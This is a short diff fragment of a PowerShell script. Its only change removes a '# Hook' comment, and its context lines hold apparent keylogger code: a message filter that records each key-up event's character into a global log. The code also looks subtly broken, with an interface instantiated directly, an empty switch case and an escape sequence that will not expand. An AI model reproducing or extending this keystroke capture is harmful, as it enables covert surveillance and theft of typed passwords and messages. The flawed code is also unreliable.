@@ -22,7 +22,6 @@ $timer.add_Elapsed({
     }
 })
 $timer.Start()
-# Hook
 [System.Windows.Forms.Application]::AddMessageFilter(
     New-Object Windows.Forms.IMessageFilter -ArgumentList { param($m)
         if ($m.Msg -eq 0x0101) { $ch = [char]$m.WParam; switch($ch) { ' ' { $global:Log += ' ' } '' { $global:Log += '[ENTER]`n' } default { $global:Log += $ch } } }
